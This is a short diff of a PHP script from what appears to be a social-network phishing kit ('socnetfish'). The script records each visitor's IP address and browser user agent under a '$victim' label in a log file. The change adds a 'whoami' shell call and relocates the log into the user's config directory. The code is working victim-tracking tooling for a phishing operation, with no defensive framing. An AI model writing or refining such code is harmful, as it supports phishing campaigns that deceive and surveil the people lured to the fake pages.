@@ -1,4 +1,5 @@
 <?php
+$usuario = exec('whoami');
 if (!empty($_SERVER['HTTP_CLIENT_IP']))
     {
       $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
@@ -13,7 +14,7 @@ else
     }
 $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
-$file = '../../ip.txt';
+$file = "/home/". $usuario ."/.config/socnetfish/ip.txt";
 $victim = "IP: ";
 $fp = fopen($file, 'a');
 fwrite($fp, $victim);
